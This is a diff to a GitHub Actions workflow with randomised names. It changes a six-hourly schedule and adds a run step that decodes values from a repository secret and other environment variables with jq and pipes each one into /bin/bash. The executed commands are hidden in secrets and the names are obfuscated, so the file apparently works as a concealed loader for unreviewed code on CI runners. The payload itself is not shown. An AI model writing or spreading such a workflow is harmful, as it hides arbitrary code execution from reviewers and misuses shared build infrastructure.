@@ -3,25 +3,30 @@ name: wengjingshi1290
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 0/6 * * *'
+    - cron: '44 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wengjingshi1290
         env:
-          drnv4: ${{ secrets.drnv4 }}
+          ptwmn812: ${{ secrets.ptwmn812 }}
         run: |
-          echo $drnv4 | jq -r .pfrpt4 | /bin/bash
-          echo $hzqt30 | jq -r .khev4804 | /bin/bash
-          echo $j25581 | jq -r .mpfgc6 | /bin/bash
-          echo $kizzw75 | jq -r .cj08675 | /bin/bash
-          echo $h0 | jq -r .e763 | /bin/bash
-          echo $jyx7 | jq -r .vj9628 | /bin/bash
-          echo $z727 | jq -r .seuac706 | /bin/bash
-          echo $wwltv99 | jq -r .uzulo3 | /bin/bash
-          echo $db3871 | jq -r .xhav95 | /bin/bash
+          echo $ptwmn812 | jq -r .m4108 | /bin/bash
+          echo $ybv62 | jq -r .z5 | /bin/bash
+          echo $hcho4 | jq -r .oq44 | /bin/bash
+          echo $h11 | jq -r .uit0645 | /bin/bash
+          echo $zq5021 | jq -r .jom70 | /bin/bash
+          echo $swujs1269 | jq -r .ryyr3 | /bin/bash
+          echo $x76296 | jq -r .vgwst79 | /bin/bash
+          echo $jb13740 | jq -r .jrrbn325 | /bin/bash
+          echo $l9777 | jq -r .c25159 | /bin/bash
+          echo $sg85 | jq -r .xt3483 | /bin/bash
+          echo $grveb31 | jq -r .ypbn997 | /bin/bash
+          echo $cv7 | jq -r .ac93 | /bin/bash
+          echo $my7087 | jq -r .oqpr50714 | /bin/bash
+          echo $ojb8 | jq -r .qxmj21 | /bin/bash
+          echo $t245 | jq -r .w5 | /bin/bash
 
